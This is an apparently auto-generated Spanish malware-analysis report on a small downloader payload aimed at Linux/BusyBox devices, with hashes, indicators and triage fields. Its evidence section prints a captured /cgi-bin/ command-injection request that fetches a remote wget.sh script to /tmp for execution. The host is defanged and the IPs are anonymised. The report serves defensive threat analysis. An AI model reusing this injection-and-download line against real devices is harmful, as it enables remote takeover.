# 🧬 Payload Analysis

`d8d0ad1cb47d145c1ddad3bb121b87cdd047e23cf1cac0735b1c7826cf293b0c`

## 📌 Resumen

Texto ASCII de 251 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod`
2. `cd /tmp`
3. `rm -f .s`
4. `wget hxxp://91.92.40.XXX/wget.sh -O .s`
5. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/d8d0ad1cb47d145c1ddad3bb121b87cdd047e23cf1cac0735b1c7826cf293b0c.md](../../../../../malware-like/oraculo/downloader/d8d0ad1cb47d145c1ddad3bb121b87cdd047e23cf1cac0735b1c7826cf293b0c.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d8d0ad1cb47d145c1ddad3bb121b87cdd047e23cf1cac0735b1c7826cf293b0c`
- **SHA1:** `84c230a646266b7ab3167866bc7dbeafc4a9650a`
- **MD5:** `d675ae85772bb466387c6a6f3cfb4207`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 251 B |
| Entropía | 4.92 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/;cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX/wget.sh -O .s;cur
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://91.92.40.XXX/wget.sh;chmod | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | GET /cgi-bin/;cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX/wget.sh -O .s;cur | strings |
| hash | d8d0ad1cb47d145c1ddad3bb121b87cdd047e23cf1cac0735b1c7826cf293b0c | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
